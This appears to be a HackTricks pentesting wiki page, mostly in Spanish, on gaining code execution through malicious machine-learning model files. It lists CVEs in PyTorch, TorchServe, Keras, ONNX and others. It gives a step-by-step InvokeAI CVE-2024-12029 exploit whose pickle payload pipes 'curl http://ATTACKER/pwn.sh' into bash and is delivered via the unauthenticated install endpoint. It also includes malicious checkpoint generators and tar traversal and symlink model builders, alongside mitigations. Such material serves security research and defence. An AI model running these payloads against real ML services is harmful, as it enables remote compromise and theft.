# RCE en modelos

{{#include ../banners/hacktricks-training.md}}

## Carga de modelos que conducen a RCE

Los modelos de Machine Learning suelen compartirse en diferentes formatos, como ONNX, TensorFlow, PyTorch, etc. Estos modelos pueden cargarse en las máquinas de los desarrolladores o en sistemas de producción para su uso. Normalmente los modelos no deberían contener código malicioso, pero hay casos en los que el modelo puede usarse para ejecutar código arbitrario en el sistema como una funcionalidad intencionada o debido a una vulnerabilidad en la librería de carga del modelo.

Al momento de escribir, estos son algunos ejemplos de este tipo de vulnerabilidades:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Malicious pickle in model checkpoint leads to code execution (bypassing `weights_only` safeguard)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + malicious model download causes code execution; Java deserialization RCE in management API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | Untrusted checkpoint triggers pickle reducer during `load_model_trainer_states_from_checkpoint` → code execution in ML worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Cargar modelo desde YAML usa `yaml.unsafe_load` (ejecución de código) <br> Cargar un modelo con la capa **Lambda** ejecuta código Python arbitrario          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Crafted `.tflite` model triggers integer overflow → heap corruption (potential RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Loading a model via `joblib.load` executes pickle with attacker’s `__reduce__` payload                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` default allowed pickled object arrays – malicious `.npy/.npz` triggers code exec                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX model’s external-weights path can escape directory (read arbitrary files) <br> Malicious ONNX model tar can overwrite arbitrary files (leading to RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Model with custom operator requires loading attacker’s native code; complex model graphs abuse logic to execute unintended computations   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Using model-load API with `--model-control` enabled allows relative path traversal to write files (e.g., overwrite `.bashrc` for RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Malformed GGUF model file causes heap buffer overflows in parser, enabling arbitrary code execution on victim system                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Malicious HDF5 (`.h5`) model with Lambda layer code still executes on load (Keras safe_mode doesn’t cover old format – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Many ML tools (e.g., pickle-based model formats, Python `pickle.load`) will execute arbitrary code embedded in model files unless mitigated | |

Además, existen algunos modelos basados en pickle de Python como los usados por [PyTorch](https://github.com/pytorch/pytorch/security) que pueden usarse para ejecutar código arbitrario en el sistema si no se cargan con `weights_only=True`. Por lo tanto, cualquier modelo basado en pickle podría ser especialmente susceptible a este tipo de ataques, incluso si no aparecen en la tabla anterior.

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` es una popular interfaz web open-source para Stable-Diffusion. Las versiones **5.3.1 – 5.4.2** exponen el endpoint REST `/api/v2/models/install` que permite a los usuarios descargar y cargar modelos desde URLs arbitrarias.

Internamente el endpoint finalmente llama a:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Cuando el archivo proporcionado es un **PyTorch checkpoint (`*.ckpt`)**, `torch.load` realiza una **pickle deserialization**. Debido a que el contenido proviene directamente de una URL controlada por el usuario, un atacante puede incrustar un objeto malicioso con un método `__reduce__` personalizado dentro del checkpoint; el método se ejecuta **durante la deserialización**, provocando **remote code execution (RCE)** en el servidor de InvokeAI.

La vulnerabilidad fue asignada **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Guía de explotación

1. Crear un checkpoint malicioso:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Aloja `payload.ckpt` en un servidor HTTP que controles (p. ej. `http://ATTACKER/payload.ckpt`).
3. Dispara el endpoint vulnerable (no se requiere autenticación):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Cuando InvokeAI descarga el archivo, llama a `torch.load()` → el gadget `os.system` se ejecuta y el atacante obtiene ejecución de código en el contexto del proceso de InvokeAI.

Ready-made exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` automates the whole flow.

#### Condiciones

•  InvokeAI 5.3.1-5.4.2 (bandera scan por defecto **false**)  
•  `/api/v2/models/install` accesible por el atacante  
•  El proceso tiene permisos para ejecutar comandos shell

#### Mitigaciones

* Actualizar a **InvokeAI ≥ 5.4.3** – el parche establece `scan=True` por defecto y realiza escaneos de malware antes de la deserialización.  
* Al cargar checkpoints programáticamente use `torch.load(file, weights_only=True)` o la nueva función auxiliar [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).  
* Aplicar listas de permitidos / firmas para las fuentes de modelos y ejecutar el servicio con el principio de menor privilegio.

> ⚠️ Recuerde que **cualquier** formato basado en Python pickle (incluyendo muchos `.pt`, `.pkl`, `.ckpt`, `.pth` files) es inherentemente inseguro para deserializar desde fuentes no confiables.

---

Example of an ad-hoc mitigation if you must keep older InvokeAI versions running behind a reverse proxy:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE por uso inseguro de `torch.load` (CVE-2025-23298)

NVIDIA’s Transformers4Rec (part of Merlin) expuso un cargador de checkpoint inseguro que llamaba directamente a `torch.load()` sobre rutas proporcionadas por el usuario. Debido a que `torch.load` depende de Python `pickle`, un checkpoint controlado por un atacante puede ejecutar código arbitrario mediante un reducer durante la deserialización.

Ruta vulnerable (antes del fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Por qué esto conduce a RCE: En Python `pickle`, un objeto puede definir un reducer (`__reduce__`/`__setstate__`) que devuelve un callable y argumentos. El callable se ejecuta durante la deserialización. Si un objeto así está presente en un checkpoint, se ejecuta antes de que se usen los weights.

Ejemplo mínimo de checkpoint malicioso:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Delivery vectors and blast radius:
- Trojanized checkpoints/models shared via repos, buckets, or artifact registries
- Automated resume/deploy pipelines that auto-load checkpoints
- Execution happens inside training/inference workers, often with elevated privileges (e.g., root in containers)

Corrección: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) reemplazó la llamada directa a `torch.load()` por un deserializador restringido y allow-listed implementado en `transformers4rec/utils/serialization.py`. El nuevo loader valida tipos/campos y evita que callables arbitrarios sean invocados durante la carga.

Guía defensiva específica para checkpoints de PyTorch:
- No unpickle datos no confiables. Prefiera formatos no ejecutables como [Safetensors](https://huggingface.co/docs/safetensors/index) u ONNX cuando sea posible.
- Si debe usar la serialización de PyTorch, asegúrese de `weights_only=True` (soportado en versiones más nuevas de PyTorch) o use un unpickler personalizado allow-listed similar al parche de Transformers4Rec.
- Haga cumplir la procedencia/firma del modelo y realice la deserialización en sandbox (seccomp/AppArmor; non-root user; FS restringido y sin egress de red).
- Monitoree procesos hijo inesperados desde servicios ML al cargar checkpoints; trace el uso de `torch.load()`/`pickle`.

POC y referencias (vulnerable/parche):
- Loader vulnerable (pre-patch): https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- POC de checkpoint malicioso: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Loader post-patch: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Ejemplo – cómo crear un modelo malicioso de PyTorch

- Crear el modelo:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Cargar el modelo:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
## Modelos para Path Traversal

Como se comentó en [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), la mayoría de formatos de modelos usados por diferentes frameworks de IA se basan en archivos, normalmente `.zip`. Por lo tanto, podría ser posible abusar de estos formatos para realizar path traversal attacks, lo que permitiría leer archivos arbitrarios del sistema donde se carga el modelo.

Por ejemplo, con el siguiente código puedes crear un modelo que creará un archivo en el directorio `/tmp` cuando se cargue:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
O bien, con el siguiente código puedes crear un modelo que, al cargarse, creará un symlink que apunte al directorio `/tmp`:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Análisis en profundidad: Keras .keras deserialization and gadget hunting

Para una guía centrada en .keras internals, Lambda-layer RCE, el problema de importación arbitraria en ≤ 3.8, y el descubrimiento de gadgets post-fix dentro de la allowlist, vea:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Referencias

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)

{{#include ../banners/hacktricks-training.md}}
